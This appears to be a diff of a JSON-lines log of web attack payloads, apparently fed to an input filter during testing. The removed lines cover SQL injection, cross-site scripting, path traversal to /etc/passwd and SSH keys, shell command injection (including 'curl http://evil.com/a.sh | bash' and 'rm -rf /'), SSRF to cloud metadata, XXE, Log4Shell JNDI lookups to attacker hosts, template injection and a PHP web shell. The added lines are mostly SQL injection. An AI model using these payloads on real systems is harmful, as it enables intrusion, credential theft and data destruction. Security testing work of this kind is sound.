@@ -1,183 +1,499 @@
-{"ts": "2025-11-28T12:43:10.556374", "text": "SELECT * FROM users WHERE '1'='1'", "meta": {"source": "test"}}
-{"ts": "2025-11-28T12:47:01.187347", "text": "SELECT * FROM auth_user WHERE '1'='1'", "meta": {"source": "test"}}
-{"ts": "2025-11-28T13:17:50.009434", "text": "SELECT * FROM auth_user WHERE '1'='1'", "meta": {"source": "test"}}
-{"ts": "2025-11-28T14:17:09.596307", "text": "' OR '1'='1", "meta": {}}
-{"ts": "2025-11-28T14:17:09.638924", "text": "' OR 'x'='x", "meta": {}}
-{"ts": "2025-11-28T14:17:09.672893", "text": "1' OR '1'='1", "meta": {}}
-{"ts": "2025-11-28T14:17:09.698226", "text": "admin' OR 1=1--", "meta": {}}
-{"ts": "2025-11-28T14:17:09.739546", "text": "' OR 'a'='a", "meta": {}}
-{"ts": "2025-11-28T14:17:09.782304", "text": "' OR ''='", "meta": {}}
-{"ts": "2025-11-28T14:17:09.823509", "text": "\" OR \"\" = \"\"", "meta": {}}
-{"ts": "2025-11-28T14:17:09.855271", "text": "' OR 1=1#", "meta": {}}
-{"ts": "2025-11-28T14:17:09.891489", "text": "' OR 1=1 -- ", "meta": {}}
-{"ts": "2025-11-28T14:17:09.920938", "text": "' OR 1=1/*", "meta": {}}
-{"ts": "2025-11-28T14:17:09.944579", "text": "1 OR 1=1", "meta": {}}
-{"ts": "2025-11-28T14:17:09.973025", "text": "' OR SLEEP(5)--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.001250", "text": "1' AND SLEEP(2) AND '1'='1", "meta": {}}
-{"ts": "2025-11-28T14:17:10.041732", "text": "' UNION SELECT NULL,NULL--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.092829", "text": "' UNION SELECT username,password FROM users--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.148534", "text": "' UNION SELECT table_name,null FROM information_schema.tables--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.198324", "text": "' UNION SELECT load_file('/etc/passwd'),null--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.245909", "text": "' UNION SELECT CHAR(65,66,67),NULL--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.293587", "text": "' AND 1=(SELECT COUNT(*) FROM users)--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.332991", "text": "' HAVING 1=1--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.368994", "text": "' GROUP BY username HAVING 1=1--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.412463", "text": "') OR 1=1/*", "meta": {}}
-{"ts": "2025-11-28T14:17:10.459089", "text": "') OR ('a'='a", "meta": {}}
-{"ts": "2025-11-28T14:17:10.514400", "text": "' OR '1'='1' {", "meta": {}}
-{"ts": "2025-11-28T14:17:10.573304", "text": "admin'--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.615664", "text": "admin' #", "meta": {}}
-{"ts": "2025-11-28T14:17:10.646563", "text": "admin'/*", "meta": {}}
-{"ts": "2025-11-28T14:17:10.683453", "text": "1'; DROP TABLE users; --", "meta": {}}
-{"ts": "2025-11-28T14:17:10.784702", "text": "' DROP TABLE users --", "meta": {}}
-{"ts": "2025-11-28T14:17:10.828716", "text": "'; EXEC xp_cmdshell('dir')--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.878139", "text": "' OR EXISTS(SELECT * FROM users)--", "meta": {}}
-{"ts": "2025-11-28T14:17:10.950041", "text": "' OR ASCII(SUBSTRING((SELECT @@version),1,1))>52--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.012547", "text": "%27%20OR%201%3D1--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.058473", "text": "%27%20OR%20%27a%27%3D%27a", "meta": {}}
-{"ts": "2025-11-28T14:17:11.101723", "text": "%2527%2520OR%25201%253D1--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.136856", "text": "%c0%27 OR 1=1--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.169129", "text": "%bf%27 OR 1=1--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.220115", "text": "1' AND (SELECT 1 FROM pg_sleep(5))--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.289603", "text": "1 AND BENCHMARK(10000000,MD5(1))--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.352748", "text": "' OR IF(1=1,SLEEP(3),0)--", "meta": {}}
-{"ts": "2025-11-28T14:17:11.437560", "text": "<script>alert(1)</script>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.491979", "text": "<img src=x onerror=alert(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.525276", "text": "<svg onload=alert(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.551117", "text": "<iframe src=javascript:alert(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.582128", "text": "<body onload=alert('XSS')>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.609865", "text": "javascript:alert(1)", "meta": {}}
-{"ts": "2025-11-28T14:17:11.648833", "text": "'><script>alert(document.cookie)</script>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.683341", "text": "\"/><script>alert(1)</script>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.729840", "text": "<embed src=javascript:alert(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.772053", "text": "<object data=javascript:alert(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.806689", "text": "<details open ontoggle=alert(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.846734", "text": "<link rel=stylesheet href=javascript:alert(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.901812", "text": "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">", "meta": {}}
-{"ts": "2025-11-28T14:17:11.942479", "text": "<scr<script>ipt>alert(1)</scr<script>ipt>", "meta": {}}
-{"ts": "2025-11-28T14:17:11.978513", "text": "<img src=x onerror=prompt(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.013692", "text": "<img src=x onerror=confirm(1)>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.106612", "text": "<svg><script>alert(1)</script></svg>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.141571", "text": "<video><source onerror=\"alert(1)\"></video>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.177170", "text": "<a href=javascript:alert(1)>click</a>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.201853", "text": "javascript:/*--><script>alert(1)</script>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.227730", "text": "`;alert(1);//", "meta": {}}
-{"ts": "2025-11-28T14:17:12.249754", "text": "</script><script>alert(1)</script>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.280124", "text": "<script src=//evil.com/xss.js></script>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.322042", "text": "<script>eval(atob('YWxlcnQoMSk='))</script>", "meta": {}}
-{"ts": "2025-11-28T14:17:12.351001", "text": "%3Cscript%3Ealert(1)%3C/script%3E", "meta": {}}
-{"ts": "2025-11-28T14:17:12.388919", "text": "&#60;script&#62;alert(1)&#60;/script&#62;", "meta": {}}
-{"ts": "2025-11-28T14:17:12.434385", "text": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "meta": {}}
-{"ts": "2025-11-28T14:17:12.466227", "text": "../../../../etc/passwd", "meta": {}}
-{"ts": "2025-11-28T14:17:12.493459", "text": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "meta": {}}
-{"ts": "2025-11-28T14:17:12.523972", "text": "/var/www/html/../../../../etc/passwd", "meta": {}}
-{"ts": "2025-11-28T14:17:12.550825", "text": "..%2f..%2f..%2fetc%2fpasswd", "meta": {}}
-{"ts": "2025-11-28T14:17:12.578040", "text": "..%c0%af..%c0%afetc/passwd", "meta": {}}
-{"ts": "2025-11-28T14:17:12.603222", "text": "..%5c..%5c..%5cwindows\\system.ini", "meta": {}}
-{"ts": "2025-11-28T14:17:12.634460", "text": "/../../../../../../boot.ini", "meta": {}}
-{"ts": "2025-11-28T14:17:12.670080", "text": "/../../../../../../root/.ssh/id_rsa", "meta": {}}
-{"ts": "2025-11-28T14:17:12.725225", "text": "....//....//....//etc/shadow", "meta": {}}
-{"ts": "2025-11-28T14:17:12.758122", "text": "..\\..\\..\\config\\database.yml", "meta": {}}
-{"ts": "2025-11-28T14:17:12.780921", "text": "; ls -la", "meta": {}}
-{"ts": "2025-11-28T14:17:12.801957", "text": "| cat /etc/passwd", "meta": {}}
-{"ts": "2025-11-28T14:17:12.826781", "text": "&& whoami", "meta": {}}
-{"ts": "2025-11-28T14:17:12.844498", "text": "|| id", "meta": {}}
-{"ts": "2025-11-28T14:17:12.866885", "text": "`id`", "meta": {}}
-{"ts": "2025-11-28T14:17:12.889230", "text": "$(whoami)", "meta": {}}
-{"ts": "2025-11-28T14:17:12.920848", "text": "`uname -a`", "meta": {}}
-{"ts": "2025-11-28T14:17:12.989426", "text": "`shutdown -h now`", "meta": {}}
-{"ts": "2025-11-28T14:17:13.035280", "text": "; rm -rf / #", "meta": {}}
-{"ts": "2025-11-28T14:17:13.086475", "text": "; ping -c 4 8.8.8.8", "meta": {}}
-{"ts": "2025-11-28T14:17:13.126091", "text": "; curl http://evil.com/a.sh | bash", "meta": {}}
-{"ts": "2025-11-28T14:17:13.169185", "text": "& net user", "meta": {}}
-{"ts": "2025-11-28T14:17:13.222194", "text": "| powershell -c whoami", "meta": {}}
-{"ts": "2025-11-28T14:17:13.249917", "text": "sleep 5 #", "meta": {}}
-{"ts": "2025-11-28T14:17:13.275731", "text": "'; ls; '", "meta": {}}
-{"ts": "2025-11-28T14:17:13.293120", "text": "a & echo hacked", "meta": {}}
-{"ts": "2025-11-28T14:17:13.319430", "text": "$(( $(echo 1) ))", "meta": {}}
-{"ts": "2025-11-28T14:17:13.343759", "text": "%3B%20ls%20-la", "meta": {}}
-{"ts": "2025-11-28T14:17:13.370663", "text": "%26%26%20whoami", "meta": {}}
-{"ts": "2025-11-28T14:17:13.404129", "text": "http://127.0.0.1/admin", "meta": {}}
-{"ts": "2025-11-28T14:17:13.443444", "text": "http://localhost:8080", "meta": {}}
-{"ts": "2025-11-28T14:17:13.484666", "text": "http://0.0.0.0:80", "meta": {}}
-{"ts": "2025-11-28T14:17:13.516154", "text": "http://[::1]/", "meta": {}}
-{"ts": "2025-11-28T14:17:13.545870", "text": "http://10.0.0.1/", "meta": {}}
-{"ts": "2025-11-28T14:17:13.579331", "text": "http://192.168.1.1/admin", "meta": {}}
-{"ts": "2025-11-28T14:17:13.610105", "text": "http://169.254.169.254/latest/meta-data/", "meta": {}}
-{"ts": "2025-11-28T14:17:13.650106", "text": "http://127.0.0.1:2375/v1.24/containers/json", "meta": {}}
-{"ts": "2025-11-28T14:17:13.680978", "text": "file:///etc/passwd", "meta": {}}
-{"ts": "2025-11-28T14:17:13.708243", "text": "dict://127.0.0.1:25/", "meta": {}}
-{"ts": "2025-11-28T14:17:13.737794", "text": "smb://127.0.0.1/", "meta": {}}
-{"ts": "2025-11-28T14:17:13.772618", "text": "gopher://127.0.0.1:11211/_stats", "meta": {}}
-{"ts": "2025-11-28T14:17:13.798990", "text": "http://127.0.0.1:8000/internal", "meta": {}}
-{"ts": "2025-11-28T14:17:13.834403", "text": "http://unix:/var/run/docker.sock:/info", "meta": {}}
-{"ts": "2025-11-28T14:17:13.865726", "text": "*)(|(objectclass=*))", "meta": {}}
-{"ts": "2025-11-28T14:17:13.897483", "text": "*))(uid=*))(|(uid=*", "meta": {}}
-{"ts": "2025-11-28T14:17:13.922281", "text": "(cn=*)", "meta": {}}
-{"ts": "2025-11-28T14:17:13.952952", "text": "*)(uid=*))(|(sn=*)", "meta": {}}
-{"ts": "2025-11-28T14:17:13.983830", "text": "admin*)(|(password=*))", "meta": {}}
-{"ts": "2025-11-28T14:17:14.011357", "text": "*)(!(|(cn=*)))", "meta": {}}
-{"ts": "2025-11-28T14:17:14.042990", "text": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "meta": {}}
-{"ts": "2025-11-28T14:17:14.081064", "text": "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>", "meta": {}}
-{"ts": "2025-11-28T14:17:14.136330", "text": "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><r>&xxe;</r>", "meta": {}}
-{"ts": "2025-11-28T14:17:14.175473", "text": "<!DOCTYPE foo [ <!ENTITY % x SYSTEM 'http://evil.com/evil.dtd'> %x; ]>", "meta": {}}
-{"ts": "2025-11-28T14:17:14.211327", "text": "<!ENTITY % xx SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">", "meta": {}}
-{"ts": "2025-11-28T14:17:14.237099", "text": "../../../../boot.ini", "meta": {}}
-{"ts": "2025-11-28T14:17:14.262214", "text": "{${jndi:ldap://attacker.com/a}}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.286031", "text": "${jndi:rmia://evil.com/bad}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.307520", "text": "{{ config.items() }}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.327830", "text": "${7*7}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.348402", "text": "{{7*7}}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.374697", "text": "${@print(md5(1))}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.396197", "text": "{{ dump(app) }}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.424780", "text": "{{ request.application.__dict__ }}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.455347", "text": "{% print 'hacked' %}", "meta": {}}
-{"ts": "2025-11-28T14:17:14.488619", "text": "AA' OR '1'='1'--", "meta": {}}
-{"ts": "2025-11-28T14:17:14.519901", "text": "A\" OR \"1\"=\"1\"--", "meta": {}}
-{"ts": "2025-11-28T14:17:14.547897", "text": "<%= system('ls') %>", "meta": {}}
-{"ts": "2025-11-28T14:17:14.580719", "text": "<% =File.open('/etc/passwd').read %>", "meta": {}}
-{"ts": "2025-11-28T14:17:14.608465", "text": "<?php system($_GET['cmd']); ?>", "meta": {}}
-
-{"ts": "2025-11-28T17:26:53.881780", "text": "username=' OR '1'='1' --", "meta": {}}
-{"ts": "2025-11-28T17:26:53.936866", "text": "' OR '1'='1' --", "meta": {}}
-{"ts": "2025-11-28T17:27:00.363635", "text": "username=' OR 'x'='x", "meta": {}}
-{"ts": "2025-11-28T17:27:00.434307", "text": "' OR 'x'='x", "meta": {}}
-{"ts": "2025-11-28T17:27:16.741148", "text": "search=[\" <script>alert('XSS')</script>\"]", "meta": {}}
-{"ts": "2025-11-28T17:27:16.813508", "text": "[\" <script>alert('XSS')</script>\"]", "meta": {}}
-{"ts": "2025-11-28T17:30:06.735238", "text": "search=[\"<scrıpt>alert('x')</scrıpt>\"]", "meta": {}}
-{"ts": "2025-11-28T17:30:06.797735", "text": "[\"<scrıpt>alert('x')</scrıpt>\"]", "meta": {}}
-{"ts": "2025-11-28T17:30:25.696964", "text": "search=['<scr&#x69;pt>alert(1)</scr&#x69;pt>']", "meta": {}}
-{"ts": "2025-11-28T17:30:25.767799", "text": "['<scr&#x69;pt>alert(1)</scr&#x69;pt>']", "meta": {}}
-{"ts": "2025-11-28T17:30:46.338863", "text": "search=[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
-{"ts": "2025-11-28T17:30:46.398982", "text": "[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
-{"ts": "2025-11-28T17:31:02.200901", "text": "search=['<a href=\"#\" oncl&#x69;ck=\"alert(1)\">click</a>']", "meta": {}}
-{"ts": "2025-11-28T17:31:02.261912", "text": "['<a href=\"#\" oncl&#x69;ck=\"alert(1)\">click</a>']", "meta": {}}
-{"ts": "2025-11-28T17:31:24.367822", "text": "search=['<svg><script>alert`x`</script></svg>']", "meta": {}}
-{"ts": "2025-11-28T17:31:24.419730", "text": "['<svg><script>alert`x`</script></svg>']", "meta": {}}
-{"ts": "2025-11-28T17:31:49.371759", "text": "search=['/?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E']", "meta": {}}
-{"ts": "2025-11-28T17:31:49.464151", "text": "['/?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E']", "meta": {}}
-{"ts": "2025-11-28T17:32:47.277056", "text": "username=1/**/OR/**/1/**/=/**/1", "meta": {}}
-{"ts": "2025-11-28T17:32:47.347178", "text": "1/**/OR/**/1/**/=/**/1", "meta": {}}
-{"ts": "2025-11-28T17:33:32.125245", "text": "username=1/**/OR/**/1/**/=/**/1", "meta": {}}
-{"ts": "2025-11-28T17:33:32.259411", "text": "1/**/OR/**/1/**/=/**/1", "meta": {}}
-{"ts": "2025-11-28T17:33:32.565696", "text": "username=1/**/OR/**/1/**/=/**/1", "meta": {}}
-{"ts": "2025-11-28T17:33:32.656145", "text": "1/**/OR/**/1/**/=/**/1", "meta": {}}
-{"ts": "2025-11-28T17:34:52.901638", "text": "search=[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
-{"ts": "2025-11-28T17:34:53.032366", "text": "[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
-{"ts": "2025-11-28T17:35:26.465277", "text": "search=[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
-{"ts": "2025-11-28T17:35:26.538943", "text": "[\"javascript:eval(atob('YWxlcnQoMSk='))\"]", "meta": {}}
-{"ts": "2025-11-28T17:35:47.490867", "text": "username=%27%20OR%201=1--", "meta": {}}
-{"ts": "2025-11-28T17:35:47.537519", "text": "%27%20OR%201=1--", "meta": {}}
-{"ts": "2025-11-28T17:36:04.872683", "text": "username=0x27 OR 1=1--", "meta": {}}
-{"ts": "2025-11-28T17:36:04.915423", "text": "0x27 OR 1=1--", "meta": {}}
-{"ts": "2025-11-28T17:36:22.019579", "text": "username='; EXEC xp_cmdshell('dir'); --", "meta": {}}
-{"ts": "2025-11-28T17:36:22.065088", "text": "'; EXEC xp_cmdshell('dir'); --", "meta": {}}
-{"ts": "2025-11-28T17:37:00.988369", "text": "username=MSDwnZKq8J2RhSAx77ydMQ==", "meta": {}}
-{"ts": "2025-11-28T17:37:01.060510", "text": "MSDwnZKq8J2RhSAx77ydMQ==", "meta": {}}
-{"ts": "2025-11-28T17:38:26.524856", "text": "OhZRO2K6kkWLKDsFg75NPqW8rdeUnBYtj0Kx8CYr5Yjz3mJvW5jqPuqybGYm4tAF", "meta": {}}
-{"ts": "2025-11-28T17:38:26.626482", "text": "username=3120f09d92aaf09d91852031efbc9d31", "meta": {}}
-{"ts": "2025-11-28T17:38:26.719321", "text": "3120f09d92aaf09d91852031efbc9d31", "meta": {}}
-{"ts": "2025-11-28T17:56:58.422097", "text": "csrfmiddlewaretoken=OhZRO2K6kkWLKDsFg75NPqW8rdeUnBYtj0Kx8CYr5Yjz3mJvW5jqPuqybGYm4tAF", "meta": {}}
-{"ts": "2025-11-28T17:56:58.543382", "text": "OhZRO2K6kkWLKDsFg75NPqW8rdeUnBYtj0Kx8CYr5Yjz3mJvW5jqPuqybGYm4tAF", "meta": {}}
-{"ts": "2025-11-28T17:56:58.714968", "text": "username=amF2YXNjcmlwdDpldmFsKGF0b2IoJ1lXeGxjblFvTVNrPScpKQo=", "meta": {}}
-{"ts": "2025-11-28T17:56:58.852744", "text": "amF2YXNjcmlwdDpldmFsKGF0b2IoJ1lXeGxjblFvTVNrPScpKQo=", "meta": {}}
+{"ts": "2025-11-29T14:59:05.588973", "text": "' OR '1'='1", "meta": {}}
+{"ts": "2025-11-29T14:59:05.634900", "text": "'' OR '1'='1' --", "meta": {}}
+{"ts": "2025-11-29T14:59:05.680242", "text": "\" OR 'x'='x\"", "meta": {}}
+{"ts": "2025-11-29T14:59:05.704942", "text": "admin' OR 1=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:05.725195", "text": "1' OR '1'='1", "meta": {}}
+{"ts": "2025-11-29T14:59:05.747177", "text": "1 OR 1=1", "meta": {}}
+{"ts": "2025-11-29T14:59:05.769240", "text": "'; DROP TABLE users; --", "meta": {}}
+{"ts": "2025-11-29T14:59:05.792367", "text": "'; SELECT SLEEP(5); --", "meta": {}}
+{"ts": "2025-11-29T14:59:05.828999", "text": "'; EXEC xp_cmdshell('dir'); --", "meta": {}}
+{"ts": "2025-11-29T14:59:05.857228", "text": "UNION SELECT NULL,NULL--", "meta": {}}
+{"ts": "2025-11-29T14:59:05.897952", "text": "UNION SELECT username,password FROM users--", "meta": {}}
+{"ts": "2025-11-29T14:59:05.937986", "text": "UNION SELECT table_name, null FROM information_schema.tables--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.065594", "text": "1' AND '1'='1", "meta": {}}
+{"ts": "2025-11-29T14:59:06.097099", "text": "') OR ('a'='a", "meta": {}}
+{"ts": "2025-11-29T14:59:06.177842", "text": "') OR 1=1/*", "meta": {}}
+{"ts": "2025-11-29T14:59:06.217460", "text": "') OR ('x'='x", "meta": {}}
+{"ts": "2025-11-29T14:59:06.254470", "text": "admin'/*", "meta": {}}
+{"ts": "2025-11-29T14:59:06.304601", "text": "admin' --", "meta": {}}
+{"ts": "2025-11-29T14:59:06.329692", "text": "%27%20OR%201%3D1--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.359568", "text": "%2527%2520OR%25201%253D1--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.412952", "text": "0x27 OR 1=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.442227", "text": "%c0%27 OR 1=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.467035", "text": "%bf%27 OR 1=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.496956", "text": "1' AND (SELECT 1 FROM pg_sleep(5))--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.538953", "text": "1 AND BENCHMARK(10000000,MD5(1))--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.564338", "text": "'; WAITFOR DELAY '0:0:05'--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.588632", "text": "' OR SLEEP(5)--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.618289", "text": "1' AND SLEEP(2) AND '1'='1", "meta": {}}
+{"ts": "2025-11-29T14:59:06.649180", "text": "' OR IF(1=1,SLEEP(3),0)--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.672644", "text": "' HAVING 1=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.692357", "text": "GROUP BY username HAVING 1=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.716832", "text": "') UNION SELECT load_file('/etc/passwd'),null--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.735087", "text": "\" OR \"\" = \"\" --", "meta": {}}
+{"ts": "2025-11-29T14:59:06.752404", "text": "' OR ''='", "meta": {}}
+{"ts": "2025-11-29T14:59:06.771921", "text": "'%27; DROP TABLE users; --", "meta": {}}
+{"ts": "2025-11-29T14:59:06.789911", "text": "1; DROP TABLE users", "meta": {}}
+{"ts": "2025-11-29T14:59:06.810412", "text": "'; SHUTDOWN; --", "meta": {}}
+{"ts": "2025-11-29T14:59:06.831599", "text": "1' OR EXISTS(SELECT * FROM users)--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.860260", "text": "AND ASCII(SUBSTRING((SELECT @@version),1,1))>52--", "meta": {}}
+{"ts": "2025-11-29T14:59:06.879536", "text": "'||' OR 'a'='a", "meta": {}}
+{"ts": "2025-11-29T14:59:06.898056", "text": "\" OR 'a'='a\"", "meta": {}}
+{"ts": "2025-11-29T14:59:06.915221", "text": "1' OR 1=1#", "meta": {}}
+{"ts": "2025-11-29T14:59:06.939234", "text": "';CREATE TABLE hacked (a INT); --", "meta": {}}
+{"ts": "2025-11-29T14:59:06.961361", "text": "';ALTER TABLE users ADD COLUMN pwned INT; --", "meta": {}}
+{"ts": "2025-11-29T14:59:06.983001", "text": "UNION ALL SELECT username,password FROM users--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.005292", "text": "UNION SELECT username, password FROM mysql.user--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.025159", "text": "OR 1=1 LIMIT 1", "meta": {}}
+{"ts": "2025-11-29T14:59:07.044355", "text": "1' UNION SELECT NULL, username, password FROM users--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.063433", "text": "1' OR 1=1/*", "meta": {}}
+{"ts": "2025-11-29T14:59:07.090228", "text": "CONCAT(CHAR(97),CHAR(98),CHAR(99))", "meta": {}}
+{"ts": "2025-11-29T14:59:07.111739", "text": "UNION SELECT 1, LOAD_FILE('/etc/passwd')--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.132846", "text": "'|| (SELECT version()) --", "meta": {}}
+{"ts": "2025-11-29T14:59:07.154437", "text": "'; DECLARE @x INT; SET @x=1; --", "meta": {}}
+{"ts": "2025-11-29T14:59:07.174882", "text": "0; EXEC xp_cmdshell('whoami')", "meta": {}}
+{"ts": "2025-11-29T14:59:07.198348", "text": "1' AND (SELECT TOP 1 name FROM sysobjects)=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.218729", "text": "OR 1 GROUP BY CONCAT(username, password) HAVING 1=1", "meta": {}}
+{"ts": "2025-11-29T14:59:07.240069", "text": "0x27 OR 0x31=0x31--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.259485", "text": "' OR '1'='1' /*", "meta": {}}
+{"ts": "2025-11-29T14:59:07.283010", "text": "1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-29T14:59:07.306892", "text": "username=1/**/OR/**/1/**/=/**/1", "meta": {}}
+{"ts": "2025-11-29T14:59:07.323809", "text": "1 OR 1=1#", "meta": {}}
+{"ts": "2025-11-29T14:59:07.342095", "text": "'%27 OR 'a'='a", "meta": {}}
+{"ts": "2025-11-29T14:59:07.360558", "text": "') OR 1=1-- -", "meta": {}}
+{"ts": "2025-11-29T14:59:07.380581", "text": "AND 1=(SELECT COUNT(*) FROM users)--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.401150", "text": "';SELECT pg_sleep(10);--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.423447", "text": "');EXEC('calc')--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.445819", "text": "/*!50000SELECT * FROM users*/", "meta": {}}
+{"ts": "2025-11-29T14:59:07.472891", "text": "extractvalue(1,concat(0x7e,(select database()),0x7e))", "meta": {}}
+{"ts": "2025-11-29T14:59:07.499364", "text": "updatexml(1,concat(0x7e,(select @@version),0x7e),1)", "meta": {}}
+{"ts": "2025-11-29T14:59:07.523412", "text": "1; DROP TABLE auth_user;", "meta": {}}
+{"ts": "2025-11-29T14:59:07.542331", "text": "OR 1=1 ORDER BY 1--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.562185", "text": "OR 1=1 LIMIT 1 OFFSET 0", "meta": {}}
+{"ts": "2025-11-29T14:59:07.585426", "text": "UNION SELECT NULL,CONCAT(username,':',password) FROM users--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.607859", "text": "UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.633864", "text": "'; BEGIN; UPDATE users SET is_admin=1 WHERE id=1; COMMIT; --", "meta": {}}
+{"ts": "2025-11-29T14:59:07.658061", "text": "'; INSERT INTO admin_accounts (user) VALUES ('attacker'); --", "meta": {}}
+{"ts": "2025-11-29T14:59:07.677902", "text": "SELECT * FROM users WHERE username = '' OR 1=1 --", "meta": {}}
+{"ts": "2025-11-29T14:59:07.694637", "text": "\" OR 1=1--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.711323", "text": "\" OR 1=1#", "meta": {}}
+{"ts": "2025-11-29T14:59:07.729636", "text": "1' AND SLEEP(10)--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.753491", "text": "OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(5) END)--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.776141", "text": "1' OR SUBSTRING(@@version,1,1)='5'--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.796865", "text": "CONVERT(INT, (SELECT COUNT(*) FROM users))--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.815827", "text": "X' OR 'X'='X", "meta": {}}
+{"ts": "2025-11-29T14:59:07.836499", "text": "') OR (SELECT * FROM users) = 1--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.854915", "text": "' OR 1=1 LIMIT 1; --", "meta": {}}
+{"ts": "2025-11-29T14:59:07.873699", "text": "' OR 1=1 UNION SELECT NULL--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.893084", "text": "'||' OR '1'='1'||'", "meta": {}}
+{"ts": "2025-11-29T14:59:07.918859", "text": "1' AND (SELECT ASCII(SUBSTRING((SELECT user()),1,1)))>48--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.942883", "text": "UNION SELECT NULL, HEX(load_file('/etc/passwd'))--", "meta": {}}
+{"ts": "2025-11-29T14:59:07.961711", "text": "1; exec('ls')", "meta": {}}
+{"ts": "2025-11-29T14:59:07.980423", "text": "1' OR sleep(0.1)#", "meta": {}}
+{"ts": "2025-11-29T14:59:07.997469", "text": "' OR 2>1--", "meta": {}}
+{"ts": "2025-11-29T14:59:08.019065", "text": "' OR 'x'='x') OR ('x'='x", "meta": {}}
+{"ts": "2025-11-29T14:59:08.039131", "text": "or 1=1/* comment */", "meta": {}}
+{"ts": "2025-11-29T14:59:08.058401", "text": "') or 1=1 -- -", "meta": {}}
+{"ts": "2025-11-29T14:59:08.079767", "text": "1 or benchmark(1000000,sha1(1))--", "meta": {}}
